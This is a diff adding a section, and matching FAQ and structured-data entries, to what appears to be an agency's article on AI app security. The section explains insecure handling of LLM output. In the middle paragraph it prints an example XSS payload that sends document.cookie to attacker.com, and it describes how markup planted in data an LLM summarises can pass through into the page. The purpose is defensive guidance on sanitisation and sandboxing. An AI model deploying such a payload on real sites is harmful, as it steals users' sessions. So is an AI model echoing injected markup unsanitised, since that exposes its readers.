@@ -57,6 +57,16 @@ Demand answers to these three structural questions:
 | **"How do you prevent the AI Agent from executing SSRF attacks?"** | "The AI is only programmed to answer customer questions, so it won't do that." | "We run the AI Agent in an isolated, ephemeral Docker container (a sandbox) with zero network access to internal corporate subnets. It physically cannot reach the billing database." |
 | **"How do you secure API Keys?"** | "We put the OpenAI key in the frontend React `.env` file." | "API keys never touch the frontend. All AI requests route through our secure backend API gateway, which enforces rate-limiting and authenticates the user before appending the API key." |
 
+## The Third Vulnerability: Insecure Output Handling
+
+Most engineering teams fixate on what goes *into* the LLM (Prompt Injection) and what the LLM can *reach* (SSRF), but the OWASP Top 10 for LLM Applications identifies a third, equally dangerous category: **Insecure Output Handling**. This vulnerability isn't about what a hacker sends to the AI — it's about what happens when your application blindly trusts what the AI sends back.
+
+Consider a real scenario: an "AI app development company" builds an internal analytics dashboard where an LLM generates a summary of quarterly sales data, and the frontend renders that summary directly into the page using `dangerouslySetInnerHTML` (React) or an equivalent raw-HTML injection method, because it makes the AI's markdown formatting (bold text, bullet points) render nicely. This looks harmless in a demo. It becomes a Stored Cross-Site Scripting (XSS) vulnerability the moment an attacker manages to get malicious markup into any data source the LLM summarizes — a support ticket, a product review, a CRM note. If the LLM faithfully repeats `<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>` as part of its "summary," and the frontend renders it unsanitized, every employee who views that dashboard has just had their session cookies exfiltrated.
+
+The same failure mode extends beyond the browser. If an agency wires the LLM's output directly into a system command, a database query, or a code execution sandbox — a common pattern in "AI coding assistant" and "AI agent" features — an attacker who can influence the LLM's input can potentially achieve remote code execution purely through natural language, without ever touching a line of actual code themselves.
+
+The fix requires treating every LLM output exactly like untrusted user input, because that is precisely what it is: text influenced, directly or indirectly, by data the AI ingested. A secure AI app development company enforces three non-negotiable rules: (1) LLM output destined for a browser is always rendered through a sanitization library (like DOMPurify) that strips executable script tags, never through raw HTML injection; (2) LLM output is never passed to `eval()`, a shell command, or a database query without the same parameterization and escaping used for human-submitted input; (3) any AI Agent capable of executing code or commands runs that execution inside the same sandboxed, network-isolated environment described above for SSRF protection, so even a successful manipulation cannot reach production systems.
+
 ## The Manifera AI Governance Standard
 
 The rise of generative AI has spawned thousands of "order-taker" agencies that know how to write a prompt, but have zero understanding of cybersecurity. 
@@ -87,6 +97,9 @@ Because they treat AI integration as a simple frontend task. They believe that c
 
 ### (Scenario: Procurement Officer evaluating Manifera) How does Manifera's Hybrid Model ensure our AI features are secure?
 Our Dutch Architects act as the security gatekeepers. They design the isolated Docker sandboxes and strict network topologies required to run AI safely. Our Vietnamese engineering pods execute within this secure blueprint. The Dutch Architect reviews all AI integration code to ensure zero access to internal subnets is granted to the LLM agent, ensuring enterprise-grade security.
+
+### (Scenario: CISO reviewing an AI dashboard feature) What is Insecure Output Handling and how does it lead to XSS attacks?
+Insecure Output Handling is an OWASP-recognized LLM vulnerability where an application blindly trusts and renders an AI's output without sanitization. If an LLM's summary or response is injected directly as raw HTML and an attacker manages to plant malicious script tags in any data the AI summarizes, that script executes in every user's browser who views it, enabling session cookie theft. The fix is treating all LLM output as untrusted input, sanitizing it with a library like DOMPurify before rendering and never passing it directly to eval(), shell commands, or database queries.
 
 <script type="application/ld+json">
 {
@@ -131,6 +144,14 @@ Our Dutch Architects act as the security gatekeepers. They design the isolated D
       "acceptedAnswer": {
         "@type": "Answer",
         "text": "Our Dutch Architects design the secure AI infrastructure (network isolation, Docker sandboxing, Validator pipelines) before our Vietnamese pods write code. We enforce European cybersecurity standards on every AI integration."
+      }
+    },
+    {
+      "@type": "Question",
+      "name": "What is Insecure Output Handling and how does it lead to XSS attacks?",
+      "acceptedAnswer": {
+        "@type": "Answer",
+        "text": "Insecure Output Handling is an OWASP-recognized LLM vulnerability where an app blindly trusts and renders AI output without sanitization. If malicious script tags reach the LLM through any summarized data source and are rendered as raw HTML, they execute in the viewer's browser, enabling cookie theft. The fix is sanitizing all LLM output with a library like DOMPurify and never passing it directly to eval(), shell commands, or database queries."
       }
     }
   ]
